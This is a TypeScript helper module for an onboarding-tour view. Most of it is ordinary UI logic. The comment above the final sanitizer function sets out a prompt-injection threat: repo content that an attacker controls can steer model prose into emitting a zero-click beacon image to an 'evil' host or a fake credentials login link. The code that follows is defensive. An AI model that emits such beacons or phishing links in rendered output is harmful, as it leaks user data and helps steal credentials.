/** Pure helpers for OnboardingTourView — no React, no data access. */

import type { Onboarding, OnboardingSection } from "@devdigest/shared";

/**
 * "Never generated" vs. a stored tour. The discriminator is `generated_at`,
 * NEVER `sections.length` (A6, SPEC-03 D3): the server guarantees
 * `status: 'ready'` pairs a null `generated_at` with an empty `sections`
 * array, and a non-null `generated_at` with all five sections.
 */
export function isEmptyTour(tour: Onboarding): boolean {
  // `generated_at` is `.nullish()` on the wire (`z.string().nullish()`), so
  // it can arrive as `undefined`, not just `null` — a strict `=== null`
  // would fall through to the fully-generated branch and try to render
  // `sections: []` as a real tour.
  return tour.generated_at == null;
}

/** The last generation attempt did not produce a storable tour (AC-23). */
export function isSkeletonTour(tour: Onboarding): boolean {
  return tour.status === "skeleton";
}

/** One section by `kind`, or `undefined` for the empty state / a skeleton
    (both carry `sections: []`). */
export function sectionByKind(
  sections: readonly OnboardingSection[],
  kind: OnboardingSection["kind"],
): OnboardingSection | undefined {
  return sections.find((section) => section.kind === kind);
}

/** `generated_at` as a locale timestamp, or `null` for the empty state. Falls
    back to the raw string on an unparsable value rather than rendering
    "Invalid Date". */
export function formatGeneratedAt(iso: string | null | undefined): string | null {
  if (!iso) return null;
  const d = new Date(iso);
  return Number.isNaN(d.getTime()) ? iso : d.toLocaleString();
}

/** Which skeleton icon best matches the reason — a failed/degraded index
    reads as a warning, everything else (no clone yet / disabled / not
    indexed / a one-off model failure) reads as "not ready yet". */
export function skeletonIconFor(
  reason: Onboarding["reason"],
): "AlertTriangle" | "Clock" {
  return reason === "failed" || reason === "degraded" ? "AlertTriangle" : "Clock";
}

/**
 * The section `body` is model prose grounded in repo files, and BOTH are
 * attacker-influenceable (any public repo can be imported). It is rendered as
 * markdown, and the vendored `Markdown` primitive allows any `http(s)` URL —
 * so an injected `![](https://evil/p?d=…)` would beacon on render (zero click)
 * and an injected `[Configure credentials](https://evil/login)` would wear the
 * app's own link styling inside a screen the reader trusts. The evidence gate
 * covers `links[]`, never `body`.
 *
 * So: images are dropped entirely, markdown links collapse to their visible
 * text, angle-autolinks and bare URLs are de-linkified (zero-width space after
 * the scheme, so the text still reads but remark-gfm no longer autolinks it).
 * File paths, code spans and every other markdown feature are untouched — the
 * only thing removed is the ability to point the reader somewhere.
 */
export function sanitizeSectionBody(body: string): string {
  return body
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, "$1")
    .replace(/\[([^\]]*)\]\([^)]*\)/g, "$1")
    .replace(/<((?:https?|mailto):[^>]*)>/gi, "$1")
    .replace(/\b(https?|mailto):(?=\S)/gi, "$1:\u200b");
}
